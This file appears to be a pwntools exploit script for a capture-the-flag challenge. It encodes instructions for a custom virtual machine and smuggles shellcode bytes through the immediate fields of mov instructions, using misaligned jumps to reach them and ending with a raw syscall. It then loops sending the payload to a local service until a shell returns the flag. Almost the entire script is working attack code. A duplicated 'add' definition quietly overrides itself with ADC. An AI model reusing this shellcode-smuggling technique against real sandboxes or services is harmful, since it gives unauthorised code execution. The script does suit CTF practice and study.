
IMM_POS=0x10
OPK_POS=0x4
OPC_POS=0x0
DST_POS=0xc
SRC_POS=0x8
MAXSLEN=0x10

OPK_MOV=0
OPK_ADD=1
OPK_SUB=2
OPK_LGC=4
OPK_JMP=5
OPK_LOD=6
OPK_STO=7
OPK_CRY=8
OPK_HLT=9

MAXREG=4
REG_AX=0
REG_BX=1
REG_CX=2
REG_DX=3

OPC_MRR=0
OPC_MRI=1

OPC_ADD=0
OPC_ADC=1

OPC_SUB=0
OPC_SBB=1

OPC_NOT=0
OPC_NEG=1
OPC_SGN=2
OPC_TST=4


OPC_JMP=0
OPC_JE=1


OPC_LDB=0
OPC_LDW=1

OPC_STB=0
OPC_STW=1

OPC_STC=0
OPC_CLC=1


OPC_BAK=0

from pwn import *
from asm import shcb

def pack_code(opk,opc,dst,src,imm):
    if imm<0:
        imm=0x10000+imm
    return p32((opk<<OPK_POS)|(opc<<OPC_POS)|(dst<<DST_POS)|(src<<SRC_POS)|(imm<<IMM_POS))

def mrr(d,s):
    return pack_code(OPK_MOV,OPC_MRR,d,s,0)
def mri(d,imm):
    return pack_code(OPK_MOV,OPC_MRI,d,0,imm)
def add(d,s):
    return pack_code(OPK_ADD,OPC_ADD,d,s,0)
def add(d,s):
    return pack_code(OPK_ADD,OPC_ADC,d,s,0)
def sub(d,s):
    return pack_code(OPK_SUB,OPC_SUB,d,s,0)
def sbb(d,s):
    return pack_code(OPK_SUB,OPC_SBB,d,s,0)
def ldb(d,s):
    return pack_code(OPK_LOD,OPC_LDB,d,s,0)
def ldw(d,s):
    return pack_code(OPK_LOD,OPC_LDW,d,s,0)
def stb(d,s):
    return pack_code(OPK_STO,OPC_STB,d,s,0)
def stw(d,s):
    return pack_code(OPK_STO,OPC_STW,d,s,0)
def hlt():
    return pack_code(OPK_HLT,OPC_BAK,0,0,0)

def notc(s):
    return pack_code(OPK_LGC,OPC_NOT,0,s,0)
def neg(s):
    return pack_code(OPK_LGC,OPC_NEG,0,s,0)
def sgn(s):
    return pack_code(OPK_LGC,OPC_SGN,0,s,0)
def tst(s):
    return pack_code(OPK_LGC,OPC_TST,0,s,0)
def stc():
    return pack_code(OPK_CRY,OPC_STC,0,0,0)
def clc():
    return pack_code(OPK_CRY,OPC_CLC,0,0,0)
def jmp(off):
    return pack_code(OPK_JMP,OPC_JMP,0,0,off)
def je(off):
    return pack_code(OPK_JMP,OPC_JE,0,0,off)
pld=b"".join(
    [
        jmp(4),
        jmp(100),
        jmp(100),
    ]
)
pld+=b''.join([mri(0,u16(p8(i)+b'\x84')) for i in shcb])
pld+=mri(0,u16(b"\x0f\x05"))
t=0
succ=0
while 1: 
    t+=1
    #p=process("./chall")
    p=remote("localhost",19198)
    p.send(pld)
    p.recvuntil(b"...\n")
    try:
        p.sendline(b"cat flag")
        s=p.recvuntil(b"flag{")
        s+=p.recvuntil(b"}")
        succ=1
    except:
        print("FAIL. Try again ...",t)
    if succ:
        break
    p.close()
print(s)